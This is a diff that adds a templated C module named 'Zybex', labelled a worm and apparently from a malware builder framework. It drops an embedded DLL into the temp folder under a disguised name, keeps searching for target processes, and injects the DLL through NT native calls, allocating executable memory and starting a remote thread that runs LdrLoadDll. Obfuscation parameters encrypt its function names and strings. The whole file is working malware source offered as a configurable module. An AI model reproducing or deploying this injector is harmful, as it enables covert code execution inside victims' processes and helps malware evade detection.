@@ -1,0 +1,277 @@
+#!name##Zybex
+#!itemType##worm
+#!info##A DLL injector written in C. It uses the ChipAndDale library and leverages NT functions from ntdll. When executed, it extracts the embedded DLL and saves it to the temp directory, then searches for a specified process and forces it to load the DLL.
+#!info## If the target process is not found, it waits and keeps retrying until successful. Accepts a DLL-type module.
+#!lang##c
+#!wormCompiler##Basic-C
+#!Wprocess##CoffProc
+#!itemTags##WIN##EXE
+#!inFile##RobboBase_C##robbo_base.c
+#!inFile##RobboBase_H##robbo_base.h
+#!inFile##RobboProc_H##robbo_proc.h
+#!inFile##RobboProc_C##robbo_proc.c
+#!inFile##Robbo_H##robbo.h
+#!Var##ZBX_target##notepad.exe, mspaint.exe##Names of the processes into which the DLL will be injected.. Separate names with commas ","##str
+#!Var##ZBX_dll_name##discord.dll##Name of the DLL file under which it will be saved.##str
+#!Var##ROBBO_key##abcd##The key used for encrypting function names and text strings. Can contain any letters and numbers.##str
+#!Var##ROBBO_power##34##An additional parameter that further modifies the encryption key. Must be a positive integer.##str
+#!preRT##_ROBBO##RobboShadow##ROBBO_key##ROBBO_power
+#!reqMod##ChipAndDale
+#!typeAccept##dll
+#!modCOFF##ZYBEX_COFF_OBJ##dll
+
+
+{% set ZYBEX_TARGET_PROC = _ROBBO.EncodeList(ZBX_target, ",") %}
+
+#include <stdio.h>
+#include <string.h>
+#define ROBBO_MODULE_PROC
+#include "robbo.h"
+#include <shlwapi.h>
+
+#define ZYBEX_TEMP_PID_LIST_SIZE 4096
+#define ZYBEX_BUFF_TARGET_SIZE 512
+#define ZYBEX_BUFF_PATH_SIZE 512
+#define ZYBEX_FULL_DLL_PATH_SIZE 512
+#define ZYBEX_PAUSE_PROC_FIND 5
+
+extern const unsigned char _binary_{{ZYBEX_COFF_OBJ}}_start[];
+extern const unsigned char _binary_{{ZYBEX_COFF_OBJ}}_end[];
+
+typedef NTSTATUS (*zdef_LdrLoadDll)(PWSTR, PULONG, PUNICODE_STRING, HMODULE*);
+
+static char zybex_dll_name[] = "{{ZBX_dll_name}}";
+
+// TARGET PROCESS
+int zybex_target_process[][128] = {
+    {{ZYBEX_TARGET_PROC}},
+    // NULL (end)
+    {0x00}
+};
+
+
+DWORD zybex_temp_pid_list[ZYBEX_TEMP_PID_LIST_SIZE];
+char zybex_buff_target_name[ZYBEX_BUFF_TARGET_SIZE];
+static int zybex_target_id = 0;
+
+static char zybex_buff_path[ZYBEX_BUFF_PATH_SIZE];
+static WCHAR zybex_full_dll_path[ZYBEX_FULL_DLL_PATH_SIZE];
+static WCHAR zybex_full_ready_dll_path[ZYBEX_FULL_DLL_PATH_SIZE];
+
+char* zybex_get_target(void) {
+    // memset(zybex_buff_target_name, 0, sizeof(zybex_buff_target_name));
+    int *temp = zybex_target_process[zybex_target_id];
+    if (temp[0] == 0) {
+        return 0;
+    }
+    robbo_decode2(temp, zybex_buff_target_name, ZYBEX_BUFF_TARGET_SIZE);
+    zybex_target_id++;
+    return zybex_buff_target_name;
+}
+
+
+
+HANDLE zybex_open_process(DWORD pid, ACCESS_MASK access_mask) {
+    HANDLE myProc = NULL;
+    OBJECT_ATTRIBUTES objAttr;
+    ROBBO_INITIALIZE_OBJECT_ATTRIBUTES(&objAttr, NULL, 0, NULL, NULL);
+    CLIENT_ID cli_id;
+    cli_id.UniqueProcess = (PVOID)(uintptr_t)pid;
+    cli_id.UniqueThread = 0;
+    NTSTATUS result = robbo_wapi_NtOpenProcess(&myProc, access_mask, &objAttr, &cli_id);
+    return myProc;
+}
+
+DWORD zybex_find_process_pid(char proc_name[]) {
+    memset(zybex_temp_pid_list, 0, sizeof(zybex_temp_pid_list));
+    HANDLE proc;
+    char temp_name[128];
+    DWORD bytes_written;
+    DWORD result = robbo_wapi_EnumProcesses(zybex_temp_pid_list, ZYBEX_TEMP_PID_LIST_SIZE, &bytes_written);
+    if (result == 0) {
+        return 0;
+    }
+    for (DWORD i=0;i<ZYBEX_TEMP_PID_LIST_SIZE;i++) {
+        // check end of list
+        if (zybex_temp_pid_list[i] == 0 & zybex_temp_pid_list[i+1] == 0) {
+            return 0;
+        }
+        // check process
+        proc = zybex_open_process(zybex_temp_pid_list[i], PROCESS_QUERY_INFORMATION | PROCESS_VM_READ);
+        if (!proc) {
+            continue;
+        }
+        robbo_wapi_GetModuleBaseNameA(proc, 0, temp_name, 128);
+        if (strcmp(proc_name, temp_name) == 0) {
+            CloseHandle(proc);
+            return zybex_temp_pid_list[i];
+        }
+        CloseHandle(proc);
+    }
+    return 0;
+}
+
+NTSTATUS zybex_alloc_memory(HANDLE proc_handle, PVOID mem_addr, PSIZE_T mem_size, ULONG alloc_flag, ULONG protect_flag) {
+    return robbo_wapi_NtAllocateVirtualMemory(proc_handle, mem_addr, 0, mem_size, alloc_flag, protect_flag);
+}
+
+NTSTATUS zybex_write_memory(HANDLE proc_handle, PVOID mem_addr, PVOID buff, SIZE_T bytes_num) {
+    return robbo_wapi_NtWriteVirtualMemory(proc_handle, mem_addr, buff, bytes_num, 0);
+}
+
+NTSTATUS zybex_create_thread(PHANDLE th_handle, HANDLE proc_handle, PVOID start_func, PVOID args, ACCESS_MASK accMask, ULONG create_flag) {
+    return robbo_wapi_NtCreateThreadEx(th_handle, accMask, 0, proc_handle, start_func, args, create_flag, 0, 0, 0, 0);
+}
+
+typedef struct _THREAD_DATA {
+    zdef_LdrLoadDll lld;
+    UNICODE_STRING uni_str;
+    HMODULE mod_handle;
+    ULONG flags;
+    SIZE_T data_size;
+    
+} THREAD_DATA, *PTHREAD_DATA;
+
+
+
+HANDLE WINAPI hello_world(PTHREAD_DATA th_data) {
+    th_data->lld(0, 0, &th_data->uni_str, &th_data->mod_handle);
+    return th_data->mod_handle;
+}
+
+DWORD WINAPI hello_world_end(void) {
+    return 0;
+}
+
+int zybex_inject_dll(WCHAR dll_path[], DWORD pid, PTHREAD_DATA th_data) {
+    th_data->lld = robbo_addr_LdrLoadDll();
+    robbo_wapi_RtlInitUnicodeString(&th_data->uni_str, dll_path);
+
+    HANDLE proc = zybex_open_process(pid, PROCESS_ALL_ACCESS);
+    if (!proc) {
+        return 0;
+    }
+
+    PVOID addr_buff = NULL;
+    PVOID addr_args = NULL;
+    PVOID addr_func = NULL;
+    SIZE_T size_buff = 2048;
+    SIZE_T size_args = 8192;
+    SIZE_T size_func = (char*)hello_world_end - (char*)hello_world;
+
+    NTSTATUS alloc1 = zybex_alloc_memory(proc, &addr_buff, &size_buff, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (alloc1 != 0) {
+        CloseHandle(proc);
+        return 0;
+    }
+
+    th_data->uni_str.Buffer = (WCHAR*)addr_buff;
+
+    NTSTATUS write_buff = zybex_write_memory(proc, addr_buff, dll_path, th_data->uni_str.Length);
+    SIZE_T bwrite;
+
+    if (write_buff != 0) {
+        CloseHandle(proc);
+        return 0;
+    }
+
+    NTSTATUS alloc2 = zybex_alloc_memory(proc, &addr_args, &size_args, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    NTSTATUS write_str = zybex_write_memory(proc, addr_args, th_data, th_data->data_size);
+    if (alloc2 != 0 | write_str !=0) {
+        CloseHandle(proc);
+        return 0;
+    }
+
+    NTSTATUS alloc3 = zybex_alloc_memory(proc, &addr_func, &size_func, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    NTSTATUS write_func = zybex_write_memory(proc, addr_func, (PVOID)hello_world, size_func);
+    if (alloc3 != 0 | write_func !=0) {
+        CloseHandle(proc);
+        return 0;
+    }
+
+    HANDLE myTh;
+    
+    NTSTATUS result = zybex_create_thread(&myTh, proc, addr_func, addr_args, THREAD_ALL_ACCESS, 0);
+    if (result != 0) {
+        CloseHandle(proc);
+        return 0;
+    }
+
+    CloseHandle(proc);
+    return 1;
+}
+
+void zybex_get_dll_path(char dll_name[], WCHAR wbuff[], int wbuff_size) {
+    memset(wbuff, 0, sizeof(WCHAR) * wbuff_size);
+    char buff[256];
+    GetTempPath(256, buff);
+    PathCombineA(zybex_buff_path, buff, dll_name);
+    robbo_convert_utf16(zybex_buff_path, wbuff, wbuff_size);
+}
+
+DWORD zybex_find_target(void) {
+    DWORD pid;
+    while (1) {
+        char *target_proc = zybex_get_target();
+        if (target_proc == 0) {
+            zybex_target_id = 0;
+            robbo_wapi_Sleep(ZYBEX_PAUSE_PROC_FIND * 1000);
+            continue;
+        }
+        pid = zybex_find_process_pid(target_proc);
+        if (pid == 0) {
+            continue;
+        }
+        break;
+    }
+    return pid;
+}
+
+NTSTATUS zybexb_create_file(PHANDLE file_handle, POBJECT_ATTRIBUTES obj_attr, PIO_STATUS_BLOCK io_status) {
+    NTSTATUS status = robbo_wapi_NtCreateFile(file_handle, FILE_GENERIC_WRITE, obj_attr, io_status, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_RANDOM_ACCESS|FILE_NON_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+    return status;
+}
+
+NTSTATUS zybexb_write_file(HANDLE file_handle, PIO_STATUS_BLOCK io_status, PVOID buffer, ULONG length) {
+    NTSTATUS status = robbo_wapi_NtWriteFile(file_handle, 0, 0, 0, io_status, buffer, length, 0, 0);
+    return status;
+}
+
+
+
+
+int main(void) {
+    robbo_initialize();
+    robbo_proc_initialize();
+    zybex_get_dll_path(zybex_dll_name, zybex_full_dll_path, ZYBEX_FULL_DLL_PATH_SIZE);
+    swprintf(zybex_full_ready_dll_path, ZYBEX_FULL_DLL_PATH_SIZE, L"\\??\\%ls", zybex_full_dll_path);
+
+
+    HANDLE f_handle;
+    OBJECT_ATTRIBUTES obj_attr;
+    UNICODE_STRING unstr;
+    robbo_wapi_RtlInitUnicodeString(&unstr, zybex_full_ready_dll_path);
+    InitializeObjectAttributes(&obj_attr, &unstr, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    IO_STATUS_BLOCK io_status;
+    const unsigned char *dbuff = _binary_{{ZYBEX_COFF_OBJ}}_start;
+    ULONG file_size = _binary_{{ZYBEX_COFF_OBJ}}_end - _binary_{{ZYBEX_COFF_OBJ}}_start;
+    zybexb_create_file(&f_handle, &obj_attr, &io_status);
+    zybexb_write_file(f_handle, &io_status, (PVOID)dbuff, file_size);
+    CloseHandle(f_handle);
+
+    ZYBEX_WORK:
+        THREAD_DATA thd;
+        thd.data_size = sizeof(thd);
+
+        DWORD pid = zybex_find_target();
+        if (pid) {
+            int result = zybex_inject_dll(zybex_full_dll_path, pid, &thd);
+            if (result == 0) {
+                goto ZYBEX_WORK;
+            }
+        }
+    
+
+    return 0;
+}
